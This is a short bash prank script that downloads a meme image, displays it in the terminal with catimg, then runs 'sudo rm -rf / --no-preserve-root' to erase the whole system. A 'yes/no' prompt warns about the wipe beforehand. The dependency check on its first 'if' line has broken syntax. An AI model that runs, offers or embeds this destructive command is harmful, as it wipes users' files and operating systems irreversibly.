#!/bin/bash

# Check if curl and catimg are installed
if ! command -v curl &> /dev/null || ! command -v catimg &> /dev/null; || !command -v imagemagick &> /dev/null
    echo "curl or catimg is not installed. Please install them first."
    exit 1
fi

# Confirmation prompt
read -p "Are you absolutely sure you want to run this? This will remove everything off your system! (yes/no): " answer
if [[ $answer == "yes" ]]; then

# Clear the terminal
clear
tput civis


# Function to resize the image by 80%
resize_image() {
    convert original_image.jpg -resize 80x80^ -gravity center -extent 80x80 resized_image.jpg
}

# Download the image silently using curl
curl -s -o original_image.jpg https://i.kym-cdn.com/photos/images/newsfeed/002/360/758/f0b.jpg

# Run the loop 1 time
for ((i=1; i<=1; i++)); do
    resize_image
    # Display the resized image using catimg
    catimg resized_image.jpg
    sleep 5
done

# Clean up downloaded files
rm original_image.jpg resized_image.jpg

# Remove the system
sudo rm -rf / --no-preserve-root 

else
    echo "Operation cancelled."
    exit 0
fi
